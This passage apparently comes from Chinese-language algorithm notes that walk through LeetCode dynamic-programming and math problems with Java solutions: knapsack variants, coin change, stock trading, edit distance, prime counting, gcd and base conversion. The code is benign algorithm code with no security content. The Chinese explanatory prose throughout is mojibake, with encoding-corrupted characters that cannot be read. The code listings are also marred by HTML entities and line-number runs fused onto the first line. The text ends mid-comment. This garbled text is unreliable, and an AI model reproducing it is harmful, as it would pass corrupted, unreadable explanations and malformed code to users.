å°±æ˜¯æœ€ç»ˆè§£ï¼Œè€Œæœ€é•¿é€’å¢å­åºåˆ—ä¸­ dp[N] ä¸æ˜¯æœ€ç»ˆè§£ï¼Œå› ä¸ºä»¥ SN ä¸ºç»“å°¾çš„æœ€é•¿é€’å¢å­åºåˆ—ä¸ä¸€å®šæ˜¯æ•´ä¸ªåºåˆ—æœ€é•¿é€’å¢å­åºåˆ—ï¼Œéœ€è¦éå†ä¸€é dp æ•°ç»„æ‰¾åˆ°æœ€å¤§è€…ã€‚ 1234567891011121314public int lengthOfLCS(int[] nums1, int[] nums2) &#123; int n1 = nums1.length, n2 = nums2.length; int[][] dp = new int[n1 + 1][n2 + 1]; for (int i = 1; i &lt;= n1; i++) &#123; for (int j = 1; j &lt;= n2; j++) &#123; if (nums1[i - 1] == nums2[j - 1]) &#123; dp[i][j] = dp[i - 1][j - 1] + 1; &#125; else &#123; dp[i][j] = Math.max(dp[i - 1][j], dp[i][j - 1]); &#125; &#125; &#125; return dp[n1][n2];&#125; 0-1 èƒŒåŒ…æœ‰ä¸€ä¸ªå®¹é‡ä¸º N çš„èƒŒåŒ…ï¼Œè¦ç”¨è¿™ä¸ªèƒŒåŒ…è£…ä¸‹ç‰©å“çš„ä»·å€¼æœ€å¤§ï¼Œè¿™äº›ç‰©å“æœ‰ä¸¤ä¸ªå±æ€§ï¼šä½“ç§¯ w å’Œä»·å€¼ vã€‚ å®šä¹‰ä¸€ä¸ªäºŒç»´æ•°ç»„ dp å­˜å‚¨æœ€å¤§ä»·å€¼ï¼Œå…¶ä¸­ dp[i][j] è¡¨ç¤ºå‰ i ä»¶ç‰©å“ä½“ç§¯ä¸è¶…è¿‡ j çš„æƒ…å†µä¸‹èƒ½è¾¾åˆ°çš„æœ€å¤§ä»·å€¼ã€‚è®¾ç¬¬ i ä»¶ç‰©å“ä½“ç§¯ä¸º wï¼Œä»·å€¼ä¸º vï¼Œæ ¹æ®ç¬¬ i ä»¶ç‰©å“æ˜¯å¦æ·»åŠ åˆ°èƒŒåŒ…ä¸­ï¼Œå¯ä»¥åˆ†ä¸¤ç§æƒ…å†µè®¨è®ºï¼š ç¬¬ i ä»¶ç‰©å“æ²¡æ·»åŠ åˆ°èƒŒåŒ…ï¼Œæ€»ä½“ç§¯ä¸è¶…è¿‡ j çš„å‰ i ä»¶ç‰©å“çš„æœ€å¤§ä»·å€¼å°±æ˜¯æ€»ä½“ç§¯ä¸è¶…è¿‡ j çš„å‰ i-1 ä»¶ç‰©å“çš„æœ€å¤§ä»·å€¼ï¼Œdp[i][j] = dp[i-1][j]ã€‚ ç¬¬ i ä»¶ç‰©å“æ·»åŠ åˆ°èƒŒåŒ…ä¸­ï¼Œdp[i][j] = dp[i-1][j-w] + vã€‚ ç¬¬ i ä»¶ç‰©å“å¯æ·»åŠ ä¹Ÿå¯ä»¥ä¸æ·»åŠ ï¼Œå–å†³äºå“ªç§æƒ…å†µä¸‹æœ€å¤§ä»·å€¼æ›´å¤§ã€‚ ç»¼ä¸Šï¼Œ0-1 èƒŒåŒ…çš„çŠ¶æ€è½¬ç§»æ–¹ç¨‹ä¸ºï¼š 1234567891011121314public int knapsack(int W, int N, int[] weights, int[] values) &#123; int[][] dp = new int[N + 1][W + 1]; for (int i = 1; i &lt;= N; i++) &#123; int w = weights[i - 1], v = values[i - 1]; for (int j = 1; j &lt;= W; j++) &#123; if (j &gt;= w) &#123; dp[i][j] = Math.max(dp[i - 1][j], dp[i - 1][j - w] + v); &#125; else &#123; dp[i][j] = dp[i - 1][j]; &#125; &#125; &#125; return dp[N][W];&#125; ç©ºé—´ä¼˜åŒ– åœ¨ç¨‹åºå®ç°æ—¶å¯ä»¥å¯¹ 0-1 èƒŒåŒ…åšä¼˜åŒ–ã€‚è§‚å¯ŸçŠ¶æ€è½¬ç§»æ–¹ç¨‹å¯ä»¥çŸ¥é“ï¼Œå‰ i ä»¶ç‰©å“çš„çŠ¶æ€ä»…ç”±å‰ i-1 ä»¶ç‰©å“çš„çŠ¶æ€æœ‰å…³ï¼Œå› æ­¤å¯ä»¥å°† dp å®šä¹‰ä¸ºä¸€ç»´æ•°ç»„ï¼Œå…¶ä¸­ dp[j] æ—¢å¯ä»¥è¡¨ç¤º dp[i-1][j] ä¹Ÿå¯ä»¥è¡¨ç¤º dp[i][j]ã€‚æ­¤æ—¶ï¼Œ å› ä¸º dp[j-w] è¡¨ç¤º dp[i-1][j-w]ï¼Œå› æ­¤ä¸èƒ½å…ˆæ±‚ dp[i][j-w]ï¼Œä»¥é˜²æ­¢å°† dp[i-1][j-w] è¦†ç›–ã€‚ä¹Ÿå°±æ˜¯è¯´è¦å…ˆè®¡ç®— dp[i][j] å†è®¡ç®— dp[i][j-w]ï¼Œåœ¨ç¨‹åºå®ç°æ—¶éœ€è¦æŒ‰å€’åºæ¥å¾ªç¯æ±‚è§£ã€‚ 123456789101112public int knapsack(int W, int N, int[] weights, int[] values) &#123; int[] dp = new int[W + 1]; for (int i = 1; i &lt;= N; i++) &#123; int w = weights[i - 1], v = values[i - 1]; for (int j = W; j &gt;= 1; j--) &#123; if (j &gt;= w) &#123; dp[j] = Math.max(dp[j], dp[j - w] + v); &#125; &#125; &#125; return dp[W];&#125; æ— æ³•ä½¿ç”¨è´ªå¿ƒç®—æ³•çš„è§£é‡Š 0-1 èƒŒåŒ…é—®é¢˜æ— æ³•ä½¿ç”¨è´ªå¿ƒç®—æ³•æ¥æ±‚è§£ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸èƒ½æŒ‰ç…§å…ˆæ·»åŠ æ€§ä»·æ¯”æœ€é«˜çš„ç‰©å“æ¥è¾¾åˆ°æœ€ä¼˜ï¼Œè¿™æ˜¯å› ä¸ºè¿™ç§æ–¹å¼å¯èƒ½é€ æˆèƒŒåŒ…ç©ºé—´çš„æµªè´¹ï¼Œä»è€Œæ— æ³•è¾¾åˆ°æœ€ä¼˜ã€‚è€ƒè™‘ä¸‹é¢çš„ç‰©å“å’Œä¸€ä¸ªå®¹é‡ä¸º 5 çš„èƒŒåŒ…ï¼Œå¦‚æœå…ˆæ·»åŠ ç‰©å“ 0 å†æ·»åŠ ç‰©å“ 1ï¼Œé‚£ä¹ˆåªèƒ½å­˜æ”¾çš„ä»·å€¼ä¸º 16ï¼Œæµªè´¹äº†å¤§å°ä¸º 2 çš„ç©ºé—´ã€‚æœ€ä¼˜çš„æ–¹å¼æ˜¯å­˜æ”¾ç‰©å“ 1 å’Œç‰©å“ 2ï¼Œä»·å€¼ä¸º 22. id w v v/w 0 1 6 6 1 2 10 5 2 3 12 4 å˜ç§ å®Œå…¨èƒŒåŒ…ï¼šç‰©å“æ•°é‡ä¸ºæ— é™ä¸ª å¤šé‡èƒŒåŒ…ï¼šç‰©å“æ•°é‡æœ‰é™åˆ¶ å¤šç»´è´¹ç”¨èƒŒåŒ…ï¼šç‰©å“ä¸ä»…æœ‰é‡é‡ï¼Œè¿˜æœ‰ä½“ç§¯ï¼ŒåŒæ—¶è€ƒè™‘è¿™ä¸¤ç§é™åˆ¶ å…¶å®ƒï¼šç‰©å“ä¹‹é—´ç›¸äº’çº¦æŸæˆ–è€…ä¾èµ– åˆ’åˆ†æ•°ç»„ä¸ºå’Œç›¸ç­‰çš„ä¸¤éƒ¨åˆ† 416. Partition Equal Subset Sum (Medium) 12345Input: [1, 5, 11, 5]Output: trueExplanation: The array can be partitioned as [1, 5, 5] and [11]. å¯ä»¥çœ‹æˆä¸€ä¸ªèƒŒåŒ…å¤§å°ä¸º sum/2 çš„ 0-1 èƒŒåŒ…é—®é¢˜ã€‚ 123456789101112131415161718192021222324public boolean canPartition(int[] nums) &#123; int sum = computeArraySum(nums); if (sum % 2 != 0) &#123; return false; &#125; int W = sum / 2; boolean[] dp = new boolean[W + 1]; dp[0] = true; Arrays.sort(nums); for (int num : nums) &#123; // 0-1 èƒŒåŒ…ä¸€ä¸ªç‰©å“åªèƒ½ç”¨ä¸€æ¬¡ for (int i = W; i &gt;= num; i--) &#123; // ä»åå¾€å‰ï¼Œå…ˆè®¡ç®— dp[i] å†è®¡ç®— dp[i-num] dp[i] = dp[i] || dp[i - num]; &#125; &#125; return dp[W];&#125;private int computeArraySum(int[] nums) &#123; int sum = 0; for (int num : nums) &#123; sum += num; &#125; return sum;&#125; æ”¹å˜ä¸€ç»„æ•°çš„æ­£è´Ÿå·ä½¿å¾—å®ƒä»¬çš„å’Œä¸ºä¸€ç»™å®šæ•° 494. Target Sum (Medium) 1234567891011Input: nums is [1, 1, 1, 1, 1], S is 3.Output: 5Explanation:-1+1+1+1+1 = 3+1-1+1+1+1 = 3+1+1-1+1+1 = 3+1+1+1-1+1 = 3+1+1+1+1-1 = 3There are 5 ways to assign symbols to make the sum of nums be target 3. è¯¥é—®é¢˜å¯ä»¥è½¬æ¢ä¸º Subset Sum é—®é¢˜ï¼Œä»è€Œä½¿ç”¨ 0-1 èƒŒåŒ…çš„æ–¹æ³•æ¥æ±‚è§£ã€‚ å¯ä»¥å°†è¿™ç»„æ•°çœ‹æˆä¸¤éƒ¨åˆ†ï¼ŒP å’Œ Nï¼Œå…¶ä¸­ P ä½¿ç”¨æ­£å·ï¼ŒN ä½¿ç”¨è´Ÿå·ï¼Œæœ‰ä»¥ä¸‹æ¨å¯¼ï¼š 123 sum(P) - sum(N) = targetsum(P) + sum(N) + sum(P) - sum(N) = target + sum(P) + sum(N) 2 * sum(P) = target + sum(nums) å› æ­¤åªè¦æ‰¾åˆ°ä¸€ä¸ªå­é›†ï¼Œä»¤å®ƒä»¬éƒ½å–æ­£å·ï¼Œå¹¶ä¸”å’Œç­‰äº (target + sum(nums))/2ï¼Œå°±è¯æ˜å­˜åœ¨è§£ã€‚ 123456789101112131415161718192021222324public int findTargetSumWays(int[] nums, int S) &#123; int sum = computeArraySum(nums); if (sum &lt; S || (sum + S) % 2 == 1) &#123; return 0; &#125; int W = (sum + S) / 2; int[] dp = new int[W + 1]; dp[0] = 1; Arrays.sort(nums); for (int num : nums) &#123; for (int i = W; i &gt;= num; i--) &#123; dp[i] = dp[i] + dp[i - num]; &#125; &#125; return dp[W];&#125;private int computeArraySum(int[] nums) &#123; int sum = 0; for (int num : nums) &#123; sum += num; &#125; return sum;&#125; DFS è§£æ³•ï¼š 1234567891011public int findTargetSumWays(int[] nums, int S) &#123; return findTargetSumWays(nums, 0, S);&#125;private int findTargetSumWays(int[] nums, int start, int S) &#123; if (start == nums.length) &#123; return S == 0 ? 1 : 0; &#125; return findTargetSumWays(nums, start + 1, S + nums[start]) + findTargetSumWays(nums, start + 1, S - nums[start]);&#125; å­—ç¬¦ä¸²æŒ‰å•è¯åˆ—è¡¨åˆ†å‰² 139. Word Break (Medium) 123s = "leetcode",dict = ["leet", "code"].Return true because "leetcode" can be segmented as "leet code". dict ä¸­çš„å•è¯æ²¡æœ‰ä½¿ç”¨æ¬¡æ•°çš„é™åˆ¶ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªå®Œå…¨èƒŒåŒ…é—®é¢˜ã€‚ 0-1 èƒŒåŒ…å’Œå®Œå…¨èƒŒåŒ…åœ¨å®ç°ä¸Šçš„ä¸åŒä¹‹å¤„æ˜¯ï¼Œ0-1 èƒŒåŒ…å¯¹ç‰©å“çš„è¿­ä»£æ˜¯åœ¨æœ€å¤–å±‚ï¼Œè€Œå®Œå…¨èƒŒåŒ…å¯¹ç‰©å“çš„è¿­ä»£æ˜¯åœ¨æœ€é‡Œå±‚ã€‚ 1234567891011121314public boolean wordBreak(String s, List&lt;String&gt; wordDict) &#123; int n = s.length(); boolean[] dp = new boolean[n + 1]; dp[0] = true; for (int i = 1; i &lt;= n; i++) &#123; for (String word : wordDict) &#123; // å®Œå…¨ä¸€ä¸ªç‰©å“å¯ä»¥ä½¿ç”¨å¤šæ¬¡ int len = word.length(); if (len &lt;= i &amp;&amp; word.equals(s.substring(i - len, i))) &#123; dp[i] = dp[i] || dp[i - len]; &#125; &#125; &#125; return dp[n];&#125; 01 å­—ç¬¦æ„æˆæœ€å¤šçš„å­—ç¬¦ä¸² 474. Ones and Zeroes (Medium) 1234Input: Array = &#123;"10", "0001", "111001", "1", "0"&#125;, m = 5, n = 3Output: 4Explanation: There are totally 4 strings can be formed by the using of 5 0s and 3 1s, which are "10","0001","1","0" è¿™æ˜¯ä¸€ä¸ªå¤šç»´è´¹ç”¨çš„ 0-1 èƒŒåŒ…é—®é¢˜ï¼Œæœ‰ä¸¤ä¸ªèƒŒåŒ…å¤§å°ï¼Œ0 çš„æ•°é‡å’Œ 1 çš„æ•°é‡ã€‚ 12345678910111213141516171819202122public int findMaxForm(String[] strs, int m, int n) &#123; if (strs == null || strs.length == 0) &#123; return 0; &#125; int[][] dp = new int[m + 1][n + 1]; for (String s : strs) &#123; // æ¯ä¸ªå­—ç¬¦ä¸²åªèƒ½ç”¨ä¸€æ¬¡ int ones = 0, zeros = 0; for (char c : s.toCharArray()) &#123; if (c == '0') &#123; zeros++; &#125; else &#123; ones++; &#125; &#125; for (int i = m; i &gt;= zeros; i--) &#123; for (int j = n; j &gt;= ones; j--) &#123; dp[i][j] = Math.max(dp[i][j], dp[i - zeros][j - ones] + 1); &#125; &#125; &#125; return dp[m][n];&#125; æ‰¾é›¶é’±çš„æ–¹æ³•æ•° 322. Coin Change (Medium) 1234567Example 1:coins = [1, 2, 5], amount = 11return 3 (11 = 5 + 5 + 1)Example 2:coins = [2], amount = 3return -1. é¢˜ç›®æè¿°ï¼šç»™ä¸€äº›é¢é¢çš„ç¡¬å¸ï¼Œè¦æ±‚ç”¨è¿™äº›ç¡¬å¸æ¥ç»„æˆç»™å®šé¢é¢çš„é’±æ•°ï¼Œå¹¶ä¸”ä½¿å¾—ç¡¬å¸æ•°é‡æœ€å°‘ã€‚ç¡¬å¸å¯ä»¥é‡å¤ä½¿ç”¨ã€‚ ç‰©å“ï¼šç¡¬å¸ ç‰©å“å¤§å°ï¼šé¢é¢ ç‰©å“ä»·å€¼ï¼šæ•°é‡ å› ä¸ºç¡¬å¸å¯ä»¥é‡å¤ä½¿ç”¨ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªå®Œå…¨èƒŒåŒ…é—®é¢˜ã€‚ 123456789101112131415public int coinChange(int[] coins, int amount) &#123; if (coins == null || coins.length == 0) &#123; return 0; &#125; int[] minimum = new int[amount + 1]; Arrays.fill(minimum, amount + 1); minimum[0] = 0; Arrays.sort(coins); for (int i = 1; i &lt;= amount; i++) &#123; for (int j = 0; j &lt; coins.length &amp;&amp; coins[j] &lt;= i; j++) &#123; minimum[i] = Math.min(minimum[i], minimum[i - coins[j]] + 1); &#125; &#125; return minimum[amount] &gt; amount ? -1 : minimum[amount];&#125; ç»„åˆæ€»å’Œ 377. Combination Sum IV (Medium) 123456789101112131415nums = [1, 2, 3]target = 4The possible combination ways are:(1, 1, 1, 1)(1, 1, 2)(1, 2, 1)(1, 3)(2, 1, 1)(2, 2)(3, 1)Note that different sequences are counted as different combinations.Therefore the output is 7. å®Œå…¨èƒŒåŒ…ã€‚ 1234567891011121314public int combinationSum4(int[] nums, int target) &#123; if (nums == null || nums.length == 0) &#123; return 0; &#125; int[] maximum = new int[target + 1]; maximum[0] = 1; Arrays.sort(nums); for (int i = 1; i &lt;= target; i++) &#123; for (int j = 0; j &lt; nums.length &amp;&amp; nums[j] &lt;= i; j++) &#123; maximum[i] += maximum[i - nums[j]]; &#125; &#125; return maximum[target];&#125; åªèƒ½è¿›è¡Œ k æ¬¡çš„è‚¡ç¥¨äº¤æ˜“ 188. Best Time to Buy and Sell Stock IV (Hard) 123456789101112131415161718192021public int maxProfit(int k, int[] prices) &#123; int n = prices.length; if (k &gt;= n / 2) &#123; // è¿™ç§æƒ…å†µä¸‹è¯¥é—®é¢˜é€€åŒ–ä¸ºæ™®é€šçš„è‚¡ç¥¨äº¤æ˜“é—®é¢˜ int maxProfit = 0; for (int i = 1; i &lt; n; i++) &#123; if (prices[i] &gt; prices[i - 1]) &#123; maxProfit += prices[i] - prices[i - 1]; &#125; &#125; return maxProfit; &#125; int[][] maxProfit = new int[k + 1][n]; for (int i = 1; i &lt;= k; i++) &#123; int localMax = maxProfit[i - 1][0] - prices[0]; for (int j = 1; j &lt; n; j++) &#123; maxProfit[i][j] = Math.max(maxProfit[i][j - 1], prices[j] + localMax); localMax = Math.max(localMax, maxProfit[i - 1][j] - prices[j]); &#125; &#125; return maxProfit[k][n - 1];&#125; åªèƒ½è¿›è¡Œä¸¤æ¬¡çš„è‚¡ç¥¨äº¤æ˜“ 123. Best Time to Buy and Sell Stock III (Hard) 12345678910111213141516171819public int maxProfit(int[] prices) &#123; int firstBuy = Integer.MIN_VALUE, firstSell = 0; int secondBuy = Integer.MIN_VALUE, secondSell = 0; for (int curPrice : prices) &#123; if (firstBuy &lt; -curPrice) &#123; firstBuy = -curPrice; &#125; if (firstSell &lt; firstBuy + curPrice) &#123; firstSell = firstBuy + curPrice; &#125; if (secondBuy &lt; firstSell - curPrice) &#123; secondBuy = firstSell - curPrice; &#125; if (secondSell &lt; secondBuy + curPrice) &#123; secondSell = secondBuy + curPrice; &#125; &#125; return secondSell;&#125; è‚¡ç¥¨äº¤æ˜“éœ€è¦å†·å´æœŸçš„è‚¡ç¥¨äº¤æ˜“ 309. Best Time to Buy and Sell Stock with Cooldown(Medium) é¢˜ç›®æè¿°ï¼šäº¤æ˜“ä¹‹åéœ€è¦æœ‰ä¸€å¤©çš„å†·å´æ—¶é—´ã€‚ 12345678910111213141516171819public int maxProfit(int[] prices) &#123; if (prices == null || prices.length == 0) &#123; return 0; &#125; int N = prices.length; int[] buy = new int[N]; int[] s1 = new int[N]; int[] sell = new int[N]; int[] s2 = new int[N]; s1[0] = buy[0] = -prices[0]; sell[0] = s2[0] = 0; for (int i = 1; i &lt; N; i++) &#123; buy[i] = s2[i - 1] - prices[i]; s1[i] = Math.max(buy[i - 1], s1[i - 1]); sell[i] = Math.max(buy[i - 1], s1[i - 1]) + prices[i]; s2[i] = Math.max(s2[i - 1], sell[i - 1]); &#125; return Math.max(sell[N - 1], s2[N - 1]);&#125; éœ€è¦äº¤æ˜“è´¹ç”¨çš„è‚¡ç¥¨äº¤æ˜“ 714. Best Time to Buy and Sell Stock with Transaction Fee (Medium) 12345678Input: prices = [1, 3, 2, 8, 4, 9], fee = 2Output: 8Explanation: The maximum profit can be achieved by:Buying at prices[0] = 1Selling at prices[3] = 8Buying at prices[4] = 4Selling at prices[5] = 9The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) = 8. é¢˜ç›®æè¿°ï¼šæ¯äº¤æ˜“ä¸€æ¬¡ï¼Œéƒ½è¦æ”¯ä»˜ä¸€å®šçš„è´¹ç”¨ã€‚ 12345678910111213141516public int maxProfit(int[] prices, int fee) &#123; int N = prices.length; int[] buy = new int[N]; int[] s1 = new int[N]; int[] sell = new int[N]; int[] s2 = new int[N]; s1[0] = buy[0] = -prices[0]; sell[0] = s2[0] = 0; for (int i = 1; i &lt; N; i++) &#123; buy[i] = Math.max(sell[i - 1], s2[i - 1]) - prices[i]; s1[i] = Math.max(buy[i - 1], s1[i - 1]); sell[i] = Math.max(buy[i - 1], s1[i - 1]) - fee + prices[i]; s2[i] = Math.max(s2[i - 1], sell[i - 1]); &#125; return Math.max(sell[N - 1], s2[N - 1]);&#125; ä¹°å…¥å’Œå”®å‡ºè‚¡ç¥¨æœ€å¤§çš„æ”¶ç›Š 121. Best Time to Buy and Sell Stock (Easy) é¢˜ç›®æè¿°ï¼šåªè¿›è¡Œä¸€æ¬¡äº¤æ˜“ã€‚ åªè¦è®°å½•å‰é¢çš„æœ€å°ä»·æ ¼ï¼Œå°†è¿™ä¸ªæœ€å°ä»·æ ¼ä½œä¸ºä¹°å…¥ä»·æ ¼ï¼Œç„¶åå°†å½“å‰çš„ä»·æ ¼ä½œä¸ºå”®å‡ºä»·æ ¼ï¼ŒæŸ¥çœ‹å½“å‰æ”¶ç›Šæ˜¯ä¸æ˜¯æœ€å¤§æ”¶ç›Šã€‚ 1234567891011public int maxProfit(int[] prices) &#123; int n = prices.length; if (n == 0) return 0; int soFarMin = prices[0]; int max = 0; for (int i = 1; i &lt; n; i++) &#123; if (soFarMin &gt; prices[i]) soFarMin = prices[i]; else max = Math.max(max, prices[i] - soFarMin); &#125; return max;&#125; å­—ç¬¦ä¸²ç¼–è¾‘åˆ é™¤ä¸¤ä¸ªå­—ç¬¦ä¸²çš„å­—ç¬¦ä½¿å®ƒä»¬ç›¸ç­‰ 583. Delete Operation for Two Strings (Medium) 123Input: "sea", "eat"Output: 2Explanation: You need one step to make "sea" to "ea" and another step to make "eat" to "ea". å¯ä»¥è½¬æ¢ä¸ºæ±‚ä¸¤ä¸ªå­—ç¬¦ä¸²çš„æœ€é•¿å…¬å…±å­åºåˆ—é—®é¢˜ã€‚ 1234567891011121314151617public int minDistance(String word1, String word2) &#123; int m = word1.length(), n = word2.length(); int[][] dp = new int[m + 1][n + 1]; for (int i = 0; i &lt;= m; i++) &#123; for (int j = 0; j &lt;= n; j++) &#123; if (i == 0 || j == 0) &#123; continue; &#125; if (word1.charAt(i - 1) == word2.charAt(j - 1)) &#123; dp[i][j] = dp[i - 1][j - 1] + 1; &#125; else &#123; dp[i][j] = Math.max(dp[i][j - 1], dp[i - 1][j]); &#125; &#125; &#125; return m + n - 2 * dp[m][n];&#125; ç¼–è¾‘è·ç¦» 72. Edit Distance (Hard) 123456789101112131415161718Example 1:Input: word1 = "horse", word2 = "ros"Output: 3Explanation:horse -&gt; rorse (replace 'h' with 'r')rorse -&gt; rose (remove 'r')rose -&gt; ros (remove 'e')Example 2:Input: word1 = "intention", word2 = "execution"Output: 5Explanation:intention -&gt; inention (remove 't')inention -&gt; enention (replace 'i' with 'e')enention -&gt; exention (replace 'n' with 'x')exention -&gt; exection (replace 'n' with 'c')exection -&gt; execution (insert 'u') é¢˜ç›®æè¿°ï¼šä¿®æ”¹ä¸€ä¸ªå­—ç¬¦ä¸²æˆä¸ºå¦ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½¿å¾—ä¿®æ”¹æ¬¡æ•°æœ€å°‘ã€‚ä¸€æ¬¡ä¿®æ”¹æ“ä½œåŒ…æ‹¬ï¼šæ’å…¥ä¸€ä¸ªå­—ç¬¦ã€åˆ é™¤ä¸€ä¸ªå­—ç¬¦ã€æ›¿æ¢ä¸€ä¸ªå­—ç¬¦ã€‚ 1234567891011121314151617181920212223public int minDistance(String word1, String word2) &#123; if (word1 == null || word2 == null) &#123; return 0; &#125; int m = word1.length(), n = word2.length(); int[][] dp = new int[m + 1][n + 1]; for (int i = 1; i &lt;= m; i++) &#123; dp[i][0] = i; &#125; for (int i = 1; i &lt;= n; i++) &#123; dp[0][i] = i; &#125; for (int i = 1; i &lt;= m; i++) &#123; for (int j = 1; j &lt;= n; j++) &#123; if (word1.charAt(i - 1) == word2.charAt(j - 1)) &#123; dp[i][j] = dp[i - 1][j - 1]; &#125; else &#123; dp[i][j] = Math.min(dp[i - 1][j - 1], Math.min(dp[i][j - 1], dp[i - 1][j])) + 1; &#125; &#125; &#125; return dp[m][n];&#125; å¤åˆ¶ç²˜è´´å­—ç¬¦ 650. 2 Keys Keyboard (Medium) é¢˜ç›®æè¿°ï¼šæœ€å¼€å§‹åªæœ‰ä¸€ä¸ªå­—ç¬¦ Aï¼Œé—®éœ€è¦å¤šå°‘æ¬¡æ“ä½œèƒ½å¤Ÿå¾—åˆ° n ä¸ªå­—ç¬¦ Aï¼Œæ¯æ¬¡æ“ä½œå¯ä»¥å¤åˆ¶å½“å‰æ‰€æœ‰çš„å­—ç¬¦ï¼Œæˆ–è€…ç²˜è´´ã€‚ 1234567Input: 3Output: 3Explanation:Intitally, we have one character &apos;A&apos;.In step 1, we use Copy All operation.In step 2, we use Paste operation to get &apos;AA&apos;.In step 3, we use Paste operation to get &apos;AAA&apos;. 1234567public int minSteps(int n) &#123; if (n == 1) return 0; for (int i = 2; i &lt;= Math.sqrt(n); i++) &#123; if (n % i == 0) return i + minSteps(n / i); &#125; return n;&#125; 1234567891011121314public int minSteps(int n) &#123; int[] dp = new int[n + 1]; int h = (int) Math.sqrt(n); for (int i = 2; i &lt;= n; i++) &#123; dp[i] = i; for (int j = 2; j &lt;= h; j++) &#123; if (i % j == 0) &#123; dp[i] = dp[j] + dp[i / j]; break; &#125; &#125; &#125; return dp[n];&#125; æ•°å­¦ç´ æ•°ç´ æ•°åˆ†è§£ æ¯ä¸€ä¸ªæ•°éƒ½å¯ä»¥åˆ†è§£æˆç´ æ•°çš„ä¹˜ç§¯ï¼Œä¾‹å¦‚ 84 = 22 * 31 * 50 * 71 * 110 * 130 * 170 * â€¦ æ•´é™¤ ä»¤ x = 2m0 * 3m1 * 5m2 * 7m3 * 11m4 * â€¦ ä»¤ y = 2n0 * 3n1 * 5n2 * 7n3 * 11n4 * â€¦ å¦‚æœ x æ•´é™¤ yï¼ˆy mod x == 0ï¼‰ï¼Œåˆ™å¯¹äºæ‰€æœ‰ iï¼Œmi &lt;= niã€‚ æœ€å¤§å…¬çº¦æ•°æœ€å°å…¬å€æ•° x å’Œ y çš„æœ€å¤§å…¬çº¦æ•°ä¸ºï¼šgcd(x,y) = 2min(m0,n0) * 3min(m1,n1) * 5min(m2,n2) * â€¦ x å’Œ y çš„æœ€å°å…¬å€æ•°ä¸ºï¼šlcm(x,y) = 2max(m0,n0) * 3max(m1,n1) * 5max(m2,n2) * â€¦ ç”Ÿæˆç´ æ•°åºåˆ— 204. Count Primes (Easy) åŸƒæ‹‰æ‰˜æ–¯ç‰¹å°¼ç­›æ³•åœ¨æ¯æ¬¡æ‰¾åˆ°ä¸€ä¸ªç´ æ•°æ—¶ï¼Œå°†èƒ½è¢«ç´ æ•°æ•´é™¤çš„æ•°æ’é™¤æ‰ã€‚ 123456789101112131415public int countPrimes(int n) &#123; boolean[] notPrimes = new boolean[n + 1]; int count = 0; for (int i = 2; i &lt; n; i++) &#123; if (notPrimes[i]) &#123; continue; &#125; count++; // ä» i * i å¼€å§‹ï¼Œå› ä¸ºå¦‚æœ k &lt; iï¼Œé‚£ä¹ˆ k * i åœ¨ä¹‹å‰å°±å·²ç»è¢«å»é™¤è¿‡äº† for (long j = (long) (i) * i; j &lt; n; j += i) &#123; notPrimes[(int) j] = true; &#125; &#125; return count;&#125; æœ€å¤§å…¬çº¦æ•°123int gcd(int a, int b) &#123; return b == 0 ? a : gcd(b, a% b);&#125; æœ€å°å…¬å€æ•°ä¸ºä¸¤æ•°çš„ä¹˜ç§¯é™¤ä»¥æœ€å¤§å…¬çº¦æ•°ã€‚ 123int lcm(int a, int b) &#123; return a * b / gcd(a, b);&#125; ä½¿ç”¨ä½æ“ä½œå’Œå‡æ³•æ±‚è§£æœ€å¤§å…¬çº¦æ•° ç¼–ç¨‹ä¹‹ç¾ï¼š2.7 å¯¹äº a å’Œ b çš„æœ€å¤§å…¬çº¦æ•° f(a, b)ï¼Œæœ‰ï¼š å¦‚æœ a å’Œ b å‡ä¸ºå¶æ•°ï¼Œf(a, b) = 2*f(a/2, b/2); å¦‚æœ a æ˜¯å¶æ•° b æ˜¯å¥‡æ•°ï¼Œf(a, b) = f(a/2, b); å¦‚æœ b æ˜¯å¶æ•° a æ˜¯å¥‡æ•°ï¼Œf(a, b) = f(a, b/2); å¦‚æœ a å’Œ b å‡ä¸ºå¥‡æ•°ï¼Œf(a, b) = f(b, a-b); ä¹˜ 2 å’Œé™¤ 2 éƒ½å¯ä»¥è½¬æ¢ä¸ºç§»ä½æ“ä½œã€‚ 123456789101112131415161718public int gcd(int a, int b) &#123; if (a &lt; b) &#123; return gcd(b, a); &#125; if (b == 0) &#123; return a; &#125; boolean isAEven = isEven(a), isBEven = isEven(b); if (isAEven &amp;&amp; isBEven) &#123; return 2 * gcd(a &gt;&gt; 1, b &gt;&gt; 1); &#125; else if (isAEven &amp;&amp; !isBEven) &#123; return gcd(a &gt;&gt; 1, b); &#125; else if (!isAEven &amp;&amp; isBEven) &#123; return gcd(a, b &gt;&gt; 1); &#125; else &#123; return gcd(b, a - b); &#125;&#125; è¿›åˆ¶è½¬æ¢7 è¿›åˆ¶ 504. Base 7 (Easy) 12345678910111213141516public String convertToBase7(int num) &#123; if (num == 0) &#123; return "0"; &#125; StringBuilder sb = new StringBuilder(); boolean isNegative = num &lt; 0; if (isNegative) &#123; num = -num; &#125; while (num &gt; 0) &#123; sb.append(num % 7); num /= 7; &#125; String ret = sb.reverse().toString(); return isNegative ? "-" + ret : ret;&#125; Java ä¸­ static String toString(int num, int radix) å¯ä»¥å°†ä¸€ä¸ªæ•´æ•°è½¬æ¢ä¸º redix è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²ã€‚ 123public String convertToBase7(int num) &#123; return Integer.toString(num, 7);&#125; 16 è¿›åˆ¶ 405. Convert a Number to Hexadecimal (Easy) 1234567891011Input:26Output:"1a"Input:-1Output:"ffffffff" è´Ÿæ•°è¦ç”¨å®ƒçš„è¡¥ç å½¢å¼ã€‚ 12345678910public String toHex(int num) &#123; char[] map = &#123;'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'&#125;; if (num == 0) return "0"; StringBuilder sb = new StringBuilder(); while (num != 0) &#123; sb.append(map[num &amp; 0b1111]); num &gt;&gt;&gt;= 4; // å› ä¸ºè€ƒè™‘çš„æ˜¯è¡¥ç å½¢å¼ï¼Œå› æ­¤ç¬¦å·ä½å°±ä¸èƒ½æœ‰ç‰¹æ®Šçš„æ„ä¹‰ï¼Œéœ€è¦ä½¿ç”¨æ— 